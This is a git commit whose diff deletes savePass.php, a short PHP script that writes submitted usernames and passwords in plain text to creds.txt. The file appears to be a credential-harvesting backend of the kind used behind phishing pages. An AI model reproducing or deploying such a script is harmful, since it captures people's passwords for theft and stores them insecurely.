3bfb9290c3269dcfe9d6da15a6123f317b610cf8
ProgammingJunior <mark.gian.rito@gmail.com>
2025-11-16 23:05:45 +0000

    yes

--- savePass.php
+++
@@ -1,8 +0,0 @@
-<?php
-$username = $_POST['username'];
-$password = $_POST['password'];
-
-$entry = "Username: $username | Password: $password\n";
-file_put_contents("creds.txt", $entry, FILE_APPEND);
-echo "Credentials saved!";
-?>
